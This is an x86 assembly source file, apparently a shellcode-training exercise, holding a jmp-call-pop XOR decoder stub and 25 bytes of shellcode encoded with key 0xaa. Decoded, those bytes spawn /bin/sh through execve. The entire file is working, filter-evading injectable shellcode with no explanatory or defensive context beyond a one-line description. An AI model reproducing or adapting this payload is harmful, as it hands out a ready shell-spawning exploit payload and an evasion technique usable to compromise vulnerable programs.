; filename: xor-decoder.nasm
; author: lawly
; description: stub that decodes the xor-encoded shellcode and passes execution to it
; 

global _start

section .text
_start:

    jmp short call_decoder

decoder:
    pop esi                     ; get address of shellcode
    xor ecx, ecx
    mov cl, 25                  ; prepare counter = length of shellcode

decode:
    xor byte [esi], 0xaa        ; use ld -N! 
    inc esi
    loop decode

    jmp short shellcode

call_decoder:
    call decoder
    shellcode:  db  0x9b,0x6a,0xfa,0xc2,0xc4,0x85,0xd9,0xc2, 0xc2, 0x85,0x85,0xc8,0xc3,0x23,0x49,0xfa,0x23, 0x48, 0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a 